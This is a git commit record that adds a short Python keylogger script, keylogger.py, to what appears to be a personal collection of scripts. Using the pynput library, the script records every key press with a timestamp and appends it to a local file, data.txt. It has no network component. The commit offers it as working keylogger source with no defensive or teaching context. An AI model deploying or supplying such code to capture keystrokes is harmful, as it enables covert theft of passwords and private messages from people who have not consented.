32b2222dc1ac1a3d4135e60c838c35210326664e
Yash Chittora <yashchittora.code@gmail.com>
2023-05-01 21:00:39 +0530

    Add Keylooger and Scripts

---
+++ Keylogger/keylogger.py
@@ -0,0 +1,20 @@
+from pynput import keyboard
+from pynput.keyboard import Key
+from datetime import datetime
+
+def surprise(key):
+    with open("data.txt","a") as file:
+        try:
+            now = datetime.now()
+            k = str(key)
+            file.write(str(now)+" : ")
+            file.write(k)
+            file.write('\n')
+
+        except:
+            print("Can't convert")
+
+if __name__ == "__main__":
+    logger = keyboard.Listener(on_press=surprise)
+    logger.start()
+    input()
